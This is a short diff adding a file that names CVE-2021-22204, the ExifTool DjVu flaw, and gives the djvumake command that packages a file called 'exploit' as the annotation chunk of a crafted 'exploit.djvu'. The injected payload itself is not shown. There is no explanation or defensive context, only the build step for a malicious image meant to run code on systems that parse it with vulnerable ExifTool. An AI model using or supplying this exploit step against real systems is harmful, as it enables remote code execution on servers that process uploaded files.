@@ -1,0 +1,3 @@
+CVE-2021-22204
+
+djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=exploit
